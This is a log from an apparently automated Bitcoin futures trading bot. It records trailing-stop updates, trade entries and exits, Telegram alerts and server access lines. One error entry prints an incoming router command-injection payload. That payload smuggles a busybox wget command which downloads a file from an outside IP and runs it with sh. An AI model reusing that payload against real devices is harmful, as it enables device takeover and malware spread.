+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73461.43 → 73461.10 (stage 0 best=73429.16 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73461.10 → 73461.09 (stage 0 best=73429.15 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73461.09 → 73461.02 (stage 0 best=73429.08 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73461.02 → 73460.95 (stage 0 best=73429.01 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73460.95 → 73460.76 (stage 0 best=73428.82 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73460.76 → 73460.67 (stage 0 best=73428.73 src=tick)
+2026-06-01 01:03:55  INFO      trail_loop — [TRAIL] Trail SL: 73460.67 → 73460.66 (stage 0 best=73428.72 src=tick)
+2026-06-01 01:03:56  INFO      trail_loop — [TRAIL] Trail SL: 73460.66 → 73460.65 (stage 0 best=73428.71 src=tick)
+2026-06-01 01:03:56  INFO      trail_loop — [TRAIL] Trail SL: 73460.65 → 73460.64 (stage 0 best=73428.70 src=tick)
+2026-06-01 01:03:56  INFO      trail_loop — [TRAIL] Trail SL: 73460.64 → 73460.14 (stage 0 best=73428.20 src=tick)
+2026-06-01 01:03:56  INFO      trail_loop — [TRAIL] Trail SL: 73460.14 → 73459.92 (stage 0 best=73427.98 src=tick)
+2026-06-01 01:03:56  INFO      trail_loop — [TRAIL] Trail SL: 73459.92 → 73459.89 (stage 0 best=73427.95 src=tick)
+2026-06-01 01:03:56  INFO      trail_loop — [TRAIL] Trail SL: 73459.89 → 73459.57 (stage 0 best=73427.63 src=tick)
+2026-06-01 01:04:13  INFO      trail_loop — [TRAIL] Offset recalibrated: +28.85 → +23.97 (binance=73463.25 delta=73439.28)
+2026-06-01 01:04:44  INFO      trail_loop — [TRAIL] Offset recalibrated: +23.97 → +19.75 (binance=73465.79 delta=73446.04)
+2026-06-01 01:05:02  INFO      trail_loop — [TRAIL] Exit fired: reason=Trail SL (stage 0) price=73459.60 source=tick atr=159.69
+2026-06-01 01:05:02  WARNING   orders.manager — [OM] cancel_bracket failed (ignored): Delta DELETE /v2/orders/bracket returned 404: Not Found
+2026-06-01 01:05:02  INFO      orders.manager — [OM] Closing position | side=buy  reason=Trail SL (stage 0)
+2026-06-01 01:05:03  INFO      orders.manager — [OM] Position closed | id=1339130195  fill=73464.50
+2026-06-01 01:05:03  INFO      trail_loop — [TRAIL] Exit order placed (attempt 1) fill=73464.5
+2026-06-01 01:05:03  INFO      trail_loop — [TRAIL] Fill correction: signal=73459.60 actual=73464.50 diff=+4.90
+2026-06-01 01:05:03  INFO      main — [EXIT] reason=Trail SL (stage 0)  source=tick  entry=73505.0  exit=73464.50  gross_pl=+0.040500 USD
+2026-06-01 01:05:03  INFO      infra.journal — Trade logged [sqlite] | Trend Short SHORT  qty=1 lots  entry=73505.00 exit=73464.50  points=+40.50  P/L=+0.0405 USD  reason=Trail SL (stage 0)
+2026-06-01 01:05:04  ERROR     infra.gsheet — GSheet connection failed: 
+2026-06-01 01:05:04  ERROR     infra.gsheet — GSheet log_trade failed: 
+2026-06-01 01:05:04  INFO      infra.journal — Open trade cleared from DB
+2026-06-01 01:05:05  INFO      infra.telegram — Telegram sent: '💰 <b>EXIT — SHORT</b>  |  <code>1</code> lot\n<code>2026-06-01 01:05:04 IST</code>\n\nEntry         : <code>$73,505.00</code>\nExit          : <b>$73,464.50</b>\nPoints        : <code>+40.50</code>\n<b>Gross P&amp;L : +$0.0405 USD</b>\nReason        : <code>Trail SL (stage 0)</code>'
+2026-06-01 01:14:44  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:01:14:44 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 01:24:01  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:01:24:01 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 01:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73544.50 true_low=73424.00 true_close=73544.50
+2026-06-01 01:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780255800000 | new_boundary=1780257600000 | bars=250 — evaluating signals...
+2026-06-01 01:30:01  INFO      main — [BAR] close=73544.50  atr=156.89  adx=26.3  rsi=40.5  trend=True  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-06-01 01:47:28  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:01:47:28 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 02:00:05  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73731.00 true_low=73542.00 true_close=73670.50
+2026-06-01 02:00:05  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780257600000 | new_boundary=1780259400000 | bars=250 — evaluating signals...
+2026-06-01 02:00:05  INFO      main — [BAR] close=73670.50  atr=159.19  adx=26.5  rsi=47.5  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 02:06:05  WARNING   feed.fills_feed — [FILLS] WS disconnected (attempt 1): no close frame received or sent — reconnecting in 5s
+2026-06-01 02:06:10  INFO      feed.fills_feed — [FILLS] WS auth sent — waiting for confirmation...
+2026-06-01 02:06:10  INFO      feed.fills_feed — [FILLS] Subscribed to user_trades | symbol=BTCUSD
+2026-06-01 02:17:27  INFO      aiohttp.access — 167.172.149.169 [01/Jun/2026:02:17:27 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+2026-06-01 02:17:28  INFO      aiohttp.access — 167.172.149.169 [01/Jun/2026:02:17:28 +0530] "GET /favicon.ico HTTP/1.1" 404 175 "http://187.127.136.139:8080/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+2026-06-01 02:25:19  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:02:25:19 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 02:30:03  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73740.50 true_low=73640.50 true_close=73717.50
+2026-06-01 02:30:03  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780259400000 | new_boundary=1780261200000 | bars=250 — evaluating signals...
+2026-06-01 02:30:03  INFO      main — [BAR] close=73717.50  atr=154.96  adx=26.3  rsi=49.8  trend=True  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-06-01 02:43:10  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:02:43:10 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 03:00:05  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73734.50 true_low=73597.00 true_close=73603.00
+2026-06-01 03:00:05  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780261200000 | new_boundary=1780263000000 | bars=250 — evaluating signals...
+2026-06-01 03:00:05  INFO      main — [BAR] close=73603.00  atr=153.71  adx=25.9  rsi=44.6  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 03:00:05  INFO      main — [SIGNAL] Trend Short  is_long=False  regime=TREND
+2026-06-01 03:00:05  INFO      orders.manager — [OM] Placing entry | side=sell  qty=1  sl=73695.23  tp=73234.09
+2026-06-01 03:00:07  INFO      orders.manager — [OM] Entry filled | id=1339166281  fill=73618.00
+2026-06-01 03:00:07  INFO      orders.manager — [OM] ✅ Emergency bracket SL placed on Delta | sl=73695.23  (never amended — Python trail owns exits)
+2026-06-01 03:00:07  INFO      trail_loop — [TRAIL] Started | entry=73618.00 sl=73695.23 tp=73234.09 entry_atr=153.71 is_long=False | trail_pts=10.76 trail_off=30.74
+2026-06-01 03:00:07  INFO      trail_loop — [TRAIL] Signal bar OHLC (informational, not applied to trail) | high=73734.50 low=73597.00 close=73603.00 atr=153.71
+2026-06-01 03:00:07  INFO      main — [ENTRY] Filled | type=Trend Short  fill=73618.00  sl=73695.23  tp=73234.09  atr=153.71  stop_dist=92.23
+2026-06-01 03:00:07  INFO      infra.journal — Open trade recorded | Trend Short  qty=1 lots  entry=73618.00
+2026-06-01 03:00:08  INFO      infra.telegram — Telegram sent: '🔴 <b>ENTRY — SHORT</b>  |  <code>1</code> lot  (0.0010 BTC)\n<code>2026-06-01 03:00:07 IST</code>\n\nFill  : <b>$73,618.00</b>\nSL    : <code>$73,695.23</code>  (-77.23)\nTP    : <code>$73,234.09</code>  (+383.91)\nATR   : <code>153.71</code>  |  R:R <code>4.97</code>'
+2026-06-01 03:00:08  INFO      trail_loop — [TRAIL] Source offset: binance=73650.51 delta=73618.00 offset=+32.51
+2026-06-01 03:00:39  INFO      trail_loop — [TRAIL] Offset recalibrated: +32.51 → +30.42 (binance=73650.52 delta=73620.10)
+2026-06-01 03:01:10  INFO      trail_loop — [TRAIL] Offset recalibrated: +30.42 → +17.73 (binance=73640.82 delta=73623.09)
+2026-06-01 03:01:19  INFO      trail_loop — [TRAIL] Trail SL: 73695.23 → 73637.98 (stage 0 best=73607.24 src=arm_tick)
+2026-06-01 03:01:19  INFO      trail_loop — [TRAIL] Trail ARMED | price=73607.24 act_price=73607.24 trail_sl=73637.98 trail_pts=10.76 trail_off=30.74
+2026-06-01 03:01:23  INFO      trail_loop — [TRAIL] Trail SL: 73637.98 → 73637.90 (stage 0 best=73607.16 src=tick)
+2026-06-01 03:01:28  INFO      trail_loop — [TRAIL] Trail SL: 73637.90 → 73634.98 (stage 0 best=73604.24 src=tick)
+2026-06-01 03:01:41  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:03:01:41 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 03:01:42  INFO      trail_loop — [TRAIL] Offset recalibrated: +17.73 → +30.36 (binance=73637.09 delta=73606.73)
+2026-06-01 03:02:08  INFO      trail_loop — [TRAIL] Trail SL: 73634.98 → 73634.40 (stage 0 best=73603.66 src=tick)
+2026-06-01 03:02:08  INFO      trail_loop — [TRAIL] Trail SL: 73634.40 → 73634.39 (stage 0 best=73603.65 src=tick)
+2026-06-01 03:02:16  INFO      trail_loop — [TRAIL] Offset recalibrated: +30.36 → +28.99 (binance=73634.02 delta=73605.03)
+2026-06-01 03:02:18  INFO      trail_loop — [TRAIL] Trail SL: 73634.39 → 73634.03 (stage 0 best=73603.29 src=tick)
+2026-06-01 03:02:47  INFO      trail_loop — [TRAIL] Offset recalibrated: +28.99 → +28.60 (binance=73634.01 delta=73605.41)
+2026-06-01 03:03:13  INFO      trail_loop — [TRAIL] Trail SL: 73634.03 → 73633.71 (stage 0 best=73602.97 src=tick)
+2026-06-01 03:03:18  INFO      trail_loop — [TRAIL] Offset recalibrated: +28.60 → +30.64 (binance=73634.01 delta=73603.37)
+2026-06-01 03:03:49  INFO      trail_loop — [TRAIL] Offset recalibrated: +30.64 → +27.63 (binance=73634.02 delta=73606.39)
+2026-06-01 03:04:20  INFO      trail_loop — [TRAIL] Offset recalibrated: +27.63 → +28.90 (binance=73648.50 delta=73619.60)
+2026-06-01 03:04:51  INFO      trail_loop — [TRAIL] Offset recalibrated: +28.90 → +30.40 (binance=73648.50 delta=73618.10)
+2026-06-01 03:04:55  INFO      trail_loop — [TRAIL] Exit fired: reason=Trail SL (stage 0) price=73633.78 source=tick atr=153.71
+2026-06-01 03:04:55  WARNING   orders.manager — [OM] cancel_bracket failed (ignored): Delta DELETE /v2/orders/bracket returned 404: Not Found
+2026-06-01 03:04:55  INFO      orders.manager — [OM] Closing position | side=buy  reason=Trail SL (stage 0)
+2026-06-01 03:04:56  INFO      orders.manager — [OM] Position closed | id=1339167112  fill=73641.00
+2026-06-01 03:04:56  INFO      trail_loop — [TRAIL] Exit order placed (attempt 1) fill=73641.0
+2026-06-01 03:04:56  INFO      trail_loop — [TRAIL] Fill correction: signal=73633.78 actual=73641.00 diff=+7.22
+2026-06-01 03:04:56  INFO      main — [EXIT] reason=Trail SL (stage 0)  source=tick  entry=73618.0  exit=73641.00  gross_pl=-0.023000 USD
+2026-06-01 03:04:56  INFO      infra.journal — Trade logged [sqlite] | Trend Short SHORT  qty=1 lots  entry=73618.00 exit=73641.00  points=-23.00  P/L=-0.0230 USD  reason=Trail SL (stage 0)
+2026-06-01 03:04:56  WARNING   infra.gsheet — GSheet not connected — skipping log_trade
+2026-06-01 03:04:56  INFO      infra.journal — Open trade cleared from DB
+2026-06-01 03:04:57  INFO      infra.telegram — Telegram sent: '🔻 <b>EXIT — SHORT</b>  |  <code>1</code> lot\n<code>2026-06-01 03:04:56 IST</code>\n\nEntry         : <code>$73,618.00</code>\nExit          : <b>$73,641.00</b>\nPoints        : <code>-23.00</code>\n<b>Gross P&amp;L : $-0.0230 USD</b>\nReason        : <code>Trail SL (stage 0)</code>'
+2026-06-01 03:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73903.50 true_low=73604.00 true_close=73847.00
+2026-06-01 03:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780263000000 | new_boundary=1780264800000 | bars=250 — evaluating signals...
+2026-06-01 03:30:01  INFO      main — [BAR] close=73847.00  atr=164.20  adx=25.1  rsi=55.4  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 03:32:07  ERROR     aiohttp.server — Error handling request
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/aiohttp/web_protocol.py", line 377, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "aiohttp/_http_parser.pyx", line 563, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://140.233.190.47/gpon+-O+/tmp/ger;sh+/tmp/ger`&ipv=0'
+      ^
+2026-06-01 03:32:07  INFO      aiohttp.access — 45.179.28.75 [01/Jun/2026:03:32:07 +0530] "UNKNOWN / HTTP/1.0" 400 334 "-" "-"
+2026-06-01 03:35:27  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:03:35:27 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 04:00:04  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73972.50 true_low=73652.50 true_close=73881.50
+2026-06-01 04:00:04  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780264800000 | new_boundary=1780266600000 | bars=250 — evaluating signals...
+2026-06-01 04:00:04  INFO      main — [BAR] close=73881.50  atr=175.33  adx=24.3  rsi=56.7  trend=True  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-06-01 04:05:22  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:04:05:22 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 04:13:04  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:04:13:04 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 04:30:12  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73982.50 true_low=73842.00 true_close=73981.00
+2026-06-01 04:30:12  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780266600000 | new_boundary=1780268400000 | bars=250 — evaluating signals...
+2026-06-01 04:30:12  INFO      main — [BAR] close=73981.00  atr=172.84  adx=23.6  rsi=60.2  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 04:32:03  ERROR     feed.ws_feed — WebSocket feed error (failure 1/5): sent 1011 (internal error) keepalive ping timeout; no close frame received
+2026-06-01 04:32:03  INFO      feed.ws_feed — Reconnecting in 5s...
+2026-06-01 04:32:08  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-06-01 04:32:08  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-06-01 04:42:22  ERROR     feed.ws_feed — WebSocket feed error (failure 1/5): sent 1011 (internal error) keepalive ping timeout; no close frame received
+2026-06-01 04:42:22  INFO      feed.ws_feed — Reconnecting in 5s...
+2026-06-01 04:42:27  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-06-01 04:42:27  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-06-01 04:49:25  ERROR     feed.ws_feed — WebSocket feed error (failure 1/5): no close frame received or sent
+2026-06-01 04:49:25  INFO      feed.ws_feed — Reconnecting in 5s...
+2026-06-01 04:49:30  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-06-01 04:49:31  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-06-01 04:49:39  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:04:49:39 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 05:00:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=74186.00 true_low=73763.00 true_close=73811.00
+2026-06-01 05:00:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780268400000 | new_boundary=1780270200000 | bars=250 — evaluating signals...
+2026-06-01 05:00:01  INFO      main — [BAR] close=73811.00  atr=190.71  adx=23.2  rsi=52.3  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 05:00:25  WARNING   feed.fills_feed — [FILLS] WS disconnected (attempt 2): no close frame received or sent — reconnecting in 10s
+2026-06-01 05:00:25  WARNING   feed.fills_feed — [FILLS] Keepalive ping failed (1): no close frame received or sent
+2026-06-01 05:00:35  INFO      feed.fills_feed — [FILLS] WS auth sent — waiting for confirmation...
+2026-06-01 05:00:35  INFO      feed.fills_feed — [FILLS] Subscribed to user_trades | symbol=BTCUSD
+2026-06-01 05:13:57  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:05:13:57 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 05:22:26  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:05:22:26 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 05:30:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73808.00 true_low=73477.50 true_close=73677.50
+2026-06-01 05:30:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780270200000 | new_boundary=1780272000000 | bars=250 — evaluating signals...
+2026-06-01 05:30:00  INFO      main — [BAR] close=73677.50  atr=200.91  adx=22.4  rsi=47.1  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 05:30:00  INFO      main — [SIGNAL] Trend Short  is_long=False  regime=TREND
+2026-06-01 05:30:00  INFO      orders.manager — [OM] Placing entry | side=sell  qty=1  sl=73798.04  tp=73195.32
+2026-06-01 05:30:01  INFO      orders.manager — [OM] Entry filled | id=1339211018  fill=73664.00
+2026-06-01 05:30:02  INFO      orders.manager — [OM] ✅ Emergency bracket SL placed on Delta | sl=73798.04  (never amended — Python trail owns exits)
+2026-06-01 05:30:02  INFO      trail_loop — [TRAIL] Started | entry=73664.00 sl=73798.04 tp=73195.32 entry_atr=200.91 is_long=False | trail_pts=14.06 trail_off=40.18
+2026-06-01 05:30:02  INFO      trail_loop — [TRAIL] Signal bar OHLC (informational, not applied to trail) | high=73808.00 low=73477.50 close=73677.50 atr=200.91
+2026-06-01 05:30:02  INFO      main — [ENTRY] Filled | type=Trend Short  fill=73664.00  sl=73798.04  tp=73195.32  atr=200.91  stop_dist=120.54
+2026-06-01 05:30:02  INFO      infra.journal — Open trade recorded | Trend Short  qty=1 lots  entry=73664.00
+2026-06-01 05:30:02  INFO      trail_loop — [TRAIL] Source offset: binance=73685.49 delta=73664.00 offset=+21.49
+2026-06-01 05:30:03  INFO      infra.telegram — Telegram sent: '🔴 <b>ENTRY — SHORT</b>  |  <code>1</code> lot  (0.0010 BTC)\n<code>2026-06-01 05:30:02 IST</code>\n\nFill  : <b>$73,664.00</b>\nSL    : <code>$73,798.04</code>  (-134.04)\nTP    : <code>$73,195.32</code>  (+468.68)\nATR   : <code>200.91</code>  |  R:R <code>3.50</code>'
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73798.04 → 73689.78 (stage 0 best=73649.60 src=arm_tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail ARMED | price=73649.60 act_price=73649.94 trail_sl=73689.78 trail_pts=14.06 trail_off=40.18
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73689.78 → 73689.77 (stage 0 best=73649.59 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73689.77 → 73689.76 (stage 0 best=73649.58 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73689.76 → 73689.54 (stage 0 best=73649.36 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73689.54 → 73688.72 (stage 0 best=73648.54 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73688.72 → 73688.71 (stage 0 best=73648.53 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73688.71 → 73688.70 (stage 0 best=73648.52 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73688.70 → 73688.69 (stage 0 best=73648.51 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73688.69 → 73688.61 (stage 0 best=73648.43 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73688.61 → 73688.01 (stage 0 best=73647.83 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73688.01 → 73687.78 (stage 0 best=73647.60 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73687.78 → 73687.77 (stage 0 best=73647.59 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73687.77 → 73687.70 (stage 0 best=73647.52 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73687.70 → 73687.69 (stage 0 best=73647.51 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73687.69 → 73687.06 (stage 0 best=73646.88 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73687.06 → 73687.05 (stage 0 best=73646.87 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73687.05 → 73686.70 (stage 0 best=73646.52 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73686.70 → 73686.69 (stage 0 best=73646.51 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73686.69 → 73686.05 (stage 0 best=73645.87 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73686.05 → 73686.03 (stage 0 best=73645.85 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73686.03 → 73686.02 (stage 0 best=73645.84 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73686.02 → 73685.98 (stage 0 best=73645.80 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73685.98 → 73685.85 (stage 0 best=73645.67 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73685.85 → 73685.70 (stage 0 best=73645.52 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73685.70 → 73685.61 (stage 0 best=73645.43 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73685.61 → 73685.37 (stage 0 best=73645.19 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73685.37 → 73685.36 (stage 0 best=73645.18 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73685.36 → 73684.99 (stage 0 best=73644.81 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73684.99 → 73684.93 (stage 0 best=73644.75 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73684.93 → 73684.70 (stage 0 best=73644.52 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73684.70 → 73684.69 (stage 0 best=73644.51 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73684.69 → 73684.14 (stage 0 best=73643.96 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73684.14 → 73684.13 (stage 0 best=73643.95 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73684.13 → 73682.99 (stage 0 best=73642.81 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73682.99 → 73682.98 (stage 0 best=73642.80 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73682.98 → 73682.97 (stage 0 best=73642.79 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73682.97 → 73682.70 (stage 0 best=73642.52 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73682.70 → 73682.69 (stage 0 best=73642.51 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73682.69 → 73682.47 (stage 0 best=73642.29 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73682.47 → 73682.16 (stage 0 best=73641.98 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73682.16 → 73682.14 (stage 0 best=73641.96 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73682.14 → 73682.13 (stage 0 best=73641.95 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73682.13 → 73681.77 (stage 0 best=73641.59 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73681.77 → 73681.76 (stage 0 best=73641.58 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73681.76 → 73681.75 (stage 0 best=73641.57 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73681.75 → 73681.60 (stage 0 best=73641.42 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73681.60 → 73681.59 (stage 0 best=73641.41 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73681.59 → 73681.58 (stage 0 best=73641.40 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73681.58 → 73681.56 (stage 0 best=73641.38 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73681.56 → 73681.25 (stage 0 best=73641.07 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73681.25 → 73681.13 (stage 0 best=73640.95 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73681.13 → 73680.70 (stage 0 best=73640.52 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73680.70 → 73680.69 (stage 0 best=73640.51 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73680.69 → 73680.09 (stage 0 best=73639.91 src=tick)
+2026-06-01 05:30:30  INFO      trail_loop — [TRAIL] Trail SL: 73680.09 → 73680.08 (stage 0 best=73639.90 src=tick)
+2026-06-01 05:30:31  INFO      trail_loop — [TRAIL] Trail SL: 73680.08 → 73680.07 (stage 0 best=73639.89 src=tick)
+2026-06-01 05:30:31  INFO      trail_loop — [TRAIL] Trail SL: 73680.07 → 73679.67 (stage 0 best=73639.49 src=tick)
+2026-06-01 05:30:31  INFO      trail_loop — [TRAIL] Trail SL: 73679.67 → 73679.43 (stage 0 best=73639.25 src=tick)
+2026-06-01 05:30:33  INFO      trail_loop — [TRAIL] Offset recalibrated: +21.49 → +10.09 (binance=73660.74 delta=73650.65)
+2026-06-01 05:30:38  INFO      trail_loop — [TRAIL] Trail SL: 73679.43 → 73669.46 (stage 0 best=73629.28 src=tick)
+2026-06-01 05:30:47  INFO      trail_loop — [TRAIL] Exit fired: reason=Trail SL (stage 0) price=73669.54 source=tick atr=200.91
+2026-06-01 05:30:48  WARNING   orders.manager — [OM] cancel_bracket failed (ignored): Delta DELETE /v2/orders/bracket returned 404: Not Found
+2026-06-01 05:30:48  INFO      orders.manager — [OM] Closing position | side=buy  reason=Trail SL (stage 0)
